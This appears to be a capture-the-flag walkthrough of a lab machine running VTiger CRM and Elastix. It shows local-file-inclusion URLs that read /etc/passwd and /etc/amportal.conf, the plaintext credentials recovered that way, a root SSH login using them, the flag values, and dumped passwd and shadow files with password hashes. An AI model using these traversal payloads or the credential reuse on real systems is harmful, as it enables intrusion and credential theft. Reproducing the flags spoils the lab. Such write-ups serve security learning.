### VTiger CRM
Reference: *https://www.exploit-db.com/exploits/18770*

Original:

```txt
https://localhost/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../etc/passwd%00
```

### Elastic Find Creds

Reference: *https://www.exploit-db.com/exploits/37637*

Modified LFI Payload

```txt
https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

![[can_see_passwords.png]]

Let's get a better view of the log:

```txt
view-source:https://10.10.10.7/vtigercrm/modules/com_vtiger_workflow/sortfieldsjson.php?module_name=../../../../../../../../../../..//etc/amportal.conf%00&module=Accounts&action
```

![[can_see_creds.png]]

Creds:

```txt
asteriskuser::jEhdIekWmdjE
admin::jEhdIekWmdjE
```

We can use these credentials to login as adim in the elastic panel.

![[elastic_admin_panel.png]]

### SSH Service

We can try to ssh to the machine using the same password we found for the admin user for Elastix.

```txt
ssh root@10.10.10.7
```

However we get an error when trying to ssh to the machine:

```txt
Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1
```

We can modify our ssh command to add support for diffie-hellman key encryption:

```bash
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -c aes256-ctr root@10.10.10.7
```

![[got_root.png]]

![[root.txt.png]]

```txt
963c711ba704b59a2ab5acab43332b81
```


![[user.txt.png]]

```txt
43b0dc42f81a4ab1efb707a6d7a4f69a
```

/etc/passwd

```txt
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/etc/news:
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
distcache:x:94:94:Distcache:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
pcap:x:77:77::/var/arpwatch:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
cyrus:x:76:12:Cyrus IMAP Server:/var/lib/imap:/bin/bash
dbus:x:81:81:System message bus:/:/sbin/nologin
apache:x:48:48:Apache:/var/www:/sbin/nologin
mailman:x:41:41:GNU Mailing List Manager:/usr/lib/mailman:/sbin/nologin
rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
asterisk:x:100:101:Asterisk VoIP PBX:/var/lib/asterisk:/bin/bash
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
spamfilter:x:500:500::/home/spamfilter:/bin/bash
haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin
fanis:x:501:501::/home/fanis:/bin/bash
```

/etc/shadow


```txt
root:$1$yYjor88z$SOARx58.XEaj14nlX4iRh1:17263:0:99999:7:::
bin:*:17263:0:99999:7:::
daemon:*:17263:0:99999:7:::
adm:*:17263:0:99999:7:::
lp:*:17263:0:99999:7:::
sync:*:17263:0:99999:7:::
shutdown:*:17263:0:99999:7:::
halt:*:17263:0:99999:7:::
mail:*:17263:0:99999:7:::
news:*:17263:0:99999:7:::
uucp:*:17263:0:99999:7:::
operator:*:17263:0:99999:7:::
games:*:17263:0:99999:7:::
gopher:*:17263:0:99999:7:::
ftp:*:17263:0:99999:7:::
nobody:*:17263:0:99999:7:::
mysql:!!:17263:0:99999:7:::
distcache:!!:17263:0:99999:7:::
vcsa:!!:17263:0:99999:7:::
pcap:!!:17263:0:99999:7:::
ntp:!!:17263:0:99999:7:::
cyrus:!!:17263:0:99999:7:::
dbus:!!:17263:0:99999:7:::
apache:!!:17263:0:99999:7:::
mailman:!!:17263:0:99999:7:::
rpc:!!:17263:0:99999:7:::
postfix:!!:17263:0:99999:7:::
asterisk:!!:17263:0:99999:7:::
rpcuser:!!:17263:0:99999:7:::
nfsnobody:!!:17263:0:99999:7:::
sshd:!!:17263:0:99999:7:::
spamfilter:!!:17263:0:99999:7:::
haldaemon:!!:17263:0:99999:7:::
xfs:!!:17263:0:99999:7:::
fanis:$1$pKpD8eOD$haUM/7L7wmQBUWAVzMy3q.:17263:0:99999:7:::
```